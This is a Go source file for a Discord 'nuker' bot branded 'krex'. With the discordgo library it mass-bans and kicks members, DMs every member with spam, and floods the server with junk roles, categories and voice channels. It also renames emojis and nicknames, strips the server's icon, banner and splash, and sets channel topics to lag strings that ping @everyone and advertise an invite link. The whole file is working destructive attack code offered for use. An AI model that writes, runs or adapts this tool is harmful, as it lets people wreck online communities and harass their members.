package main

import (
	"fmt"
	"math/rand"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

var spamMessages = []string{
	"# @everyone @here gg krex was here discord.gg/brazilia",
	"# @everyone @here krexontop discord.gg/brazilia",
	"# @everyone @here krex runs discord discord.gg/brazilia",
	"# @everyone @here krex was here 💀 discord.gg/brazilia",
}

var channelPrefixes = []string{
	"krex-",
	"krexontop-",
	"hacked-by-krex-",
	"nuked-by-",
	"destroyed-",
}

type NukeOptions struct {
	BanAll              bool
	KickAll             bool
	DmAll               bool
	DmMsg               string
	ChangeServerName    bool
	NewServerName       string
	CreateNestedChaos   bool
	ChangeAllNicknames  bool
	DestroyAppearance   bool
	CreateCategories    bool
	CreateVoiceChannels bool
}

var DefaultNukeOptions = NukeOptions{
	BanAll:              false,
	KickAll:             false,
	DmAll:               true,
	DmMsg:               "@everyone server got nuked by krex",
	ChangeServerName:    true,
	NewServerName:       "💀 NUKED BY KREX 💀",
	CreateNestedChaos:   true,
	ChangeAllNicknames:  true,
	DestroyAppearance:   true,
	CreateCategories:    true,
	CreateVoiceChannels: true,
}

func BanAllMembers(s *discordgo.Session, guildID string, options NukeOptions) {

	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var bannableMembers []*discordgo.Member
	for _, member := range members {

		if member.User.Bot {
			continue
		}

		if member.User.ID == s.State.User.ID {
			continue
		}

		bannableMembers = append(bannableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Banning %d members...", len(bannableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(bannableMembers))

	for _, member := range bannableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			if options.DmAll {

				dmChannel, err := s.UserChannelCreate(m.User.ID)
				if err == nil {

					mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, options.DmMsg)
					_, _ = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
				}
			}

			err := s.GuildBanCreateWithReason(guildID, m.User.ID, "krex was here", 0)
			if err != nil {

				if options.KickAll {
					err = s.GuildMemberDeleteWithReason(guildID, m.User.ID, "krex was here")
					if err != nil {

						printColoredLine(fmt.Sprintf("[!] Failed to ban/kick %s: %s", m.User.Username, err), colorRed)
						return
					}
					printColoredLine(fmt.Sprintf("[+] Kicked member: %s", m.User.Username), colorYellow)
				}
			} else {
				printColoredLine(fmt.Sprintf("[+] Banned member: %s", m.User.Username), colorGreen)
			}

			time.Sleep(100 * time.Millisecond)
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] Member ban/kick operations completed", colorGreen)
}

func KickAllMembers(s *discordgo.Session, guildID string, options NukeOptions) {

	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var kickableMembers []*discordgo.Member
	for _, member := range members {

		if member.User.Bot {
			continue
		}

		if member.User.ID == s.State.User.ID {
			continue
		}

		kickableMembers = append(kickableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Kicking %d members...", len(kickableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(kickableMembers))

	for _, member := range kickableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			if options.DmAll {

				dmChannel, err := s.UserChannelCreate(m.User.ID)
				if err == nil {

					mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, options.DmMsg)
					_, _ = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
				}
			}

			err = s.GuildMemberDeleteWithReason(guildID, m.User.ID, "krex was here")
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to kick %s: %s", m.User.Username, err), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Kicked member: %s", m.User.Username), colorYellow)

			time.Sleep(100 * time.Millisecond)
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] Member kick operations completed", colorGreen)
}

func DmAllMembers(s *discordgo.Session, guildID string, message string) {

	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var targetMembers []*discordgo.Member
	for _, member := range members {

		if member.User.Bot {
			continue
		}

		if member.User.ID == s.State.User.ID {
			continue
		}

		targetMembers = append(targetMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] DMing %d members...", len(targetMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(targetMembers))

	for _, member := range targetMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			dmChannel, err := s.UserChannelCreate(m.User.ID)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to create DM channel for %s: %s", m.User.Username, err), colorRed)
				return
			}

			mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, message)
			_, err = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to send DM to %s: %s", m.User.Username, err), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Sent DM to: %s", m.User.Username), colorGreen)

			time.Sleep(200 * time.Millisecond)
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] All DMs sent successfully", colorGreen)
}

func createMassRoles(s *discordgo.Session, guildID string) {
	numRoles := 100
	printColoredLine(fmt.Sprintf("[*] Creating %d roles with random unicode names...", numRoles), colorCyan)

	var wg sync.WaitGroup
	wg.Add(numRoles)

	for i := 0; i < numRoles; i++ {
		go func(index int) {
			defer wg.Done()

			roleName := generateRandomUnicode(8 + rand.Intn(5))
			colors := []int{0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF, 0xFFA500, 0x800080, 0x008000, 0x000080}

			roleParams := &discordgo.RoleParams{
				Name:        roleName,
				Color:       func(v int) *int { return &v }(colors[rand.Intn(len(colors))]),
				Hoist:       func(v bool) *bool { return &v }(true),
				Permissions: func(v int64) *int64 { return &v }(0),
				Mentionable: func(v bool) *bool { return &v }(true),
			}

			role, err := s.GuildRoleCreate(guildID, roleParams)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Error creating role %d: %s", index, err.Error()), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Created role: %s", role.Name), colorGreen)
			incrementCounter()
		}(i)
	}

	wg.Wait()
	printColoredLine("[+] All roles created successfully!", colorGreen)
}

func renameAllEmojis(s *discordgo.Session, guildID string) {
	emojis, err := s.GuildEmojis(guildID)
	if err != nil {
		printColoredLine("[!] Error getting guild emojis: "+err.Error(), colorRed)
		return
	}

	if len(emojis) == 0 {
		printColoredLine("[*] No emojis found to rename", colorYellow)
		return
	}

	printColoredLine(fmt.Sprintf("[*] Renaming %d emojis with random unicode...", len(emojis)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(emojis))

	for _, emoji := range emojis {
		go func(e *discordgo.Emoji) {
			defer wg.Done()

			newName := generateRandomUnicode(6 + rand.Intn(4))

			emojiParams := &discordgo.EmojiParams{
				Name: newName,
			}

			_, err := s.GuildEmojiEdit(guildID, e.ID, emojiParams)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Error renaming emoji %s: %s", e.Name, err.Error()), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Renamed emoji %s to: %s", e.Name, newName), colorGreen)
			incrementCounter()
		}(emoji)
	}

	wg.Wait()
	printColoredLine("[+] All emojis renamed successfully!", colorGreen)
}

func generateLagDescription() string {
	lagStrings := []string{
		"@everyone @here " + generateRandomUnicode(500),
		"🔥💀⚡️🌟✨💥🎯🚀💎🔮🌈🎪🎭🎨🎬🎵🎶🎸🥁🎹🎻🎺🎤🎧🎮🕹️🎲🎯🎪🎭🎨🎬🎵🎶🎸🥁🎹🎻🎺🎤🎧🎮🕹️🎲" + generateRandomUnicode(300),
		"KREX WAS HERE " + generateRandomUnicode(400) + " @everyone @here discord.gg/brazilia",
		"💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀" + generateRandomUnicode(200),
		"NUKED BY KREX " + generateRandomUnicode(450) + " @everyone @here",
		generateRandomUnicode(600) + " KREX RUNS DISCORD " + generateRandomUnicode(200),
	}

	return lagStrings[rand.Intn(len(lagStrings))]
}

func createNestedChaos(s *discordgo.Session, guildID string) {
	numCategories := 25
	channelsPerCategory := 8
	printColoredLine(fmt.Sprintf("[*] Creating %d categories with %d channels each...", numCategories, channelsPerCategory), colorCyan)

	for i := 0; i < numCategories; i++ {
		go func(categoryIndex int) {
			categoryName := fmt.Sprintf("💀KREX-%s", generateRandomUnicode(6))
			category, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
				Name: categoryName,
				Type: discordgo.ChannelTypeGuildCategory,
			})
			if err != nil {
				return
			}

			printColoredLine(fmt.Sprintf("[+] Created category: %s", categoryName), colorGreen)
			incrementCounter()

			for j := 0; j < channelsPerCategory; j++ {
				go func(channelIndex int) {
					channelName := generateRandomChannelName()
					channel, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
						Name:     channelName,
						Type:     discordgo.ChannelTypeGuildText,
						ParentID: category.ID,
					})
					if err != nil {
						return
					}

					printColoredLine(fmt.Sprintf("[+] Created nested channel: %s", channelName), colorGreen)
					incrementCounter()

					lagDescription := generateLagDescription()
					channelEdit := &discordgo.ChannelEdit{
						Topic: lagDescription,
					}
					s.ChannelEditComplex(channel.ID, channelEdit)
				}(j)
			}
		}(i)
	}

	printColoredLine("[+] All nested chaos creation started!", colorGreen)
}

func changeAllNicknames(s *discordgo.Session, guildID string) {
	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	var changeableMembers []*discordgo.Member
	for _, member := range members {
		if member.User.Bot {
			continue
		}
		if member.User.ID == s.State.User.ID {
			continue
		}
		changeableMembers = append(changeableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Changing nicknames for %d members...", len(changeableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(changeableMembers))

	for _, member := range changeableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			newNickname := "💀" + generateRandomUnicode(8) + "💀"
			err := s.GuildMemberNickname(guildID, m.User.ID, newNickname)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to change nickname for %s: %s", m.User.Username, err.Error()), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Changed nickname for: %s", m.User.Username), colorGreen)
			incrementCounter()
		}(member)
	}

	wg.Wait()
	printColoredLine("[+] All nickname changes completed!", colorGreen)
}

func destroyServerAppearance(s *discordgo.Session, guildID string) {
	printColoredLine("[*] Destroying server appearance...", colorCyan)

	guildParams := &discordgo.GuildParams{
		Icon: "",
	}

	_, err := s.GuildEdit(guildID, guildParams)
	if err != nil {
		printColoredLine("[!] Error removing server icon: "+err.Error(), colorRed)
	} else {
		printColoredLine("[+] Server icon removed", colorGreen)
		incrementCounter()
	}

	guildParams = &discordgo.GuildParams{
		Banner: "",
	}

	_, err = s.GuildEdit(guildID, guildParams)
	if err == nil {
		printColoredLine("[+] Server banner removed", colorGreen)
		incrementCounter()
	}

	guildParams = &discordgo.GuildParams{
		Splash: "",
	}

	_, err = s.GuildEdit(guildID, guildParams)
	if err == nil {
		printColoredLine("[+] Server splash removed", colorGreen)
		incrementCounter()
	}

	printColoredLine("[+] Server appearance destruction completed!", colorGreen)
}

func createSpamCategories(s *discordgo.Session, guildID string) {
	numCategories := 50
	printColoredLine(fmt.Sprintf("[*] Creating %d spam categories...", numCategories), colorCyan)

	var wg sync.WaitGroup
	wg.Add(numCategories)

	for i := 0; i < numCategories; i++ {
		go func(index int) {
			defer wg.Done()

			categoryName := fmt.Sprintf("💀KREX-CAT-%s", generateRandomUnicode(6))
			_, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
				Name: categoryName,
				Type: discordgo.ChannelTypeGuildCategory,
			})
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Error creating category %d: %s", index, err.Error()), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Created category: %s", categoryName), colorGreen)
			incrementCounter()
		}(i)
	}

	wg.Wait()
	printColoredLine("[+] All spam categories created!", colorGreen)
}

func createSpamVoiceChannels(s *discordgo.Session, guildID string) {
	numVoiceChannels := 50
	printColoredLine(fmt.Sprintf("[*] Creating %d spam voice channels...", numVoiceChannels), colorCyan)

	var wg sync.WaitGroup
	wg.Add(numVoiceChannels)

	for i := 0; i < numVoiceChannels; i++ {
		go func(index int) {
			defer wg.Done()

			voiceChannelName := fmt.Sprintf("🔊KREX-VOICE-%s", generateRandomUnicode(6))
			_, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
				Name: voiceChannelName,
				Type: discordgo.ChannelTypeGuildVoice,
			})
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Error creating voice channel %d: %s", index, err.Error()), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Created voice channel: %s", voiceChannelName), colorGreen)
			incrementCounter()
		}(i)
	}

	wg.Wait()
	printColoredLine("[+] All spam voice channels created!", colorGreen)
}
